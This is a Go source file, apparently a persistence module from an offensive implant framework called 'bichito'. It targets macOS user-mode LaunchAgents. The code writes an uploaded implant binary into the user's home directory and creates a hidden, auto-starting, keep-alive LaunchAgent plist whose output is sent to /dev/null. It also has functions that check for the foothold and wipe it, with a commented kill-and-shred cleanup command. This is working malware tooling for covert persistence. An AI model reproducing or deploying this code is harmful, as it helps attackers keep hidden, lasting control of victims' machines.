// +build launchd


package persistence

import (
	"bichito/modules/biterpreter"
	"encoding/json"
	"os"
	"os/user"
	"fmt"
	//"strconv"
)


type BiPersistenceLaunchd struct {
	Path string   `json:"implantpath"`
	LaunchdName string   `json:"launchdname"`
}

/*
Darwin Persistence 
	--> User-Mode 
		--> LaunchD Persistence 
			--> Triggered: User Login

AddPersistence -->
	A.Decode JSON Persistence parameters
	B.Upload one of the parameters (the implant as a binary string blob) on target hidden PATH (relative to user home)
	C.Configure and write launchd plist file file on designed plist path

CheckPersistence -->
	A.Decode JSON Persistence parameters
	B.Check both existence of binary Implant and plist file on disk

RemovePersistence -->
	A.Decode JSON Persistence parameters
	B.Wipe config plist file.
	C.Kill foothold process, and wipe file
*/
func AddPersistence(jsonPersistence string,blob string) (bool,string){

	var moduleParams *BiPersistenceLaunchd

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }

	//Fix Implant Path and set it hidden by default
	implantPath := usr.HomeDir +"/"+ moduleParams.Path

    //Fix where the AutoStart file need to be palced 
    var plistPath string
	
	plistPath = usr.HomeDir +"/Library/LaunchAgents/com."+moduleParams.LaunchdName+".agent.plist"

    //Create Autostart string and write on path
	plist_string :=
		fmt.Sprintf(
		`
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.%s.user.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>%s</string>    
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
    <true/>  
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
</dict>
</plist>
		`,moduleParams.LaunchdName,implantPath)

	plistFile, err := os.Create(plistPath)
	if err != nil {
		return true,"Error Creating Plist file:" + err.Error()
	}

	if _, err = plistFile.WriteString(plist_string); err != nil {
		return true,"Error Writing Plist file::" + err.Error()
	}	

	defer plistFile.Close()
    //Get Blob and write on implantPath


	errUpload,stringErr := biterpreter.Upload(implantPath,blob)
	if errUpload{
		return true,"Error Uploading Implant on Persistence:" + stringErr
	}

	if err = os.Chmod(implantPath, 0755); err != nil {
		return true,"Error Writing Implant file:" + err.Error()
	}

    return false,"Persisted"
}

func CheckPersistence(jsonPersistence string) (bool,string){

	var moduleParams *BiPersistenceLaunchd

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }

    var implantExists bool
	//Fix Implant Path and set it hidden by default
	implantPath := usr.HomeDir +"/"+ moduleParams.Path

	implantExists,errI := exists(implantPath)
	if errI != nil {
		return true,"Error Checking Implant File Existence:" + errI.Error()
	}

    //Fix where the AutoStart file need to be palced 
    var plistPath string
    var plistExists bool
	
	plistPath = usr.HomeDir +"/Library/LaunchAgents/com."+moduleParams.LaunchdName+".agent.plist"
	
	plistExists,errI = exists(plistPath)
	if errI != nil {
		return true,"Error Checking Plist File Existence:" + errI.Error()
	}

    var res string
    if (implantExists || plistExists){
    	res = "Persisted"
    }else{
    	res = "Non Persisted"
    }

    return false,res
}


func RemovePersistence(jsonPersistence string) (bool,string){

	var moduleParams *BiPersistenceLaunchd

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }


	//Fix Implant Path and set it hidden by default
	implantPath := usr.HomeDir +"/"+ moduleParams.Path

    //Fix where the AutoStart file need to be palced 
    var plistPath string

	plistPath = usr.HomeDir +"/Library/LaunchAgents/com."+moduleParams.LaunchdName+".agent.plist"


    //var genError string
    //Remove Autostart
    errW,errString := biterpreter.Wipe(plistPath)
    if errW != false {
		return true,"Error Removing implant:" + errString
    }

    //Set a Job on the os to kill Implant and remove it from disk
    //Get actual PID, and then exec --> kill -9 PID;sleep 5;shred implantPath;rm implantPath

    errW2,errString2 := biterpreter.Wipe(implantPath)
    if errW2 != false {
		return true,"Error Removing implant:" + errString2
    }
	
	os.Exit(1)



    return false,"Persistence Removed"
}


func exists(path string) (bool, error) {
    _, err := os.Stat(path)
    if err == nil { return true, nil }
    if os.IsNotExist(err) { return false, nil }
    return true, err
}


func CreateDirIfNotExist(dir string) (bool,error){
	var err error
	if _, err := os.Stat(dir); os.IsNotExist(err) {
    	err = os.MkdirAll(dir, 0755)
			if err != nil {
              	return true,err
            }
    }

	return false,err

}